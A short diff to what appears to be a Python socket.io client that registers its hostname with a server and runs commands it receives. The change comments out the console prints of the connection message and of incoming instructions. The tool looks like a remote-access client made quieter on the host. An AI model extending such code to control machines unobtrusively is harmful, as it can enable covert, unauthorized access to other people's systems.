@@ -198,7 +198,7 @@ hostname = get_hostname()
 
 @sio.event(namespace='/client')
 def connect():
-    print('Connected to server')
+    # print('Connected to server')
     sio.emit('exec_result', f'Connected : {hostname}', namespace='/client')
     sio.emit('set_client_info', {'username': hostname}, namespace='/client')
 
@@ -296,7 +296,7 @@ def on_file_down(data):
 @sio.on('client_event_cmd_exec', namespace='/client')
 def on_cmd_exec(instruction):
     try:
-        print(instruction)
+        # print(instruction)
         args = instruction.strip().split()
         command = args[0].lower()
         content = ' '.join(args[1:])
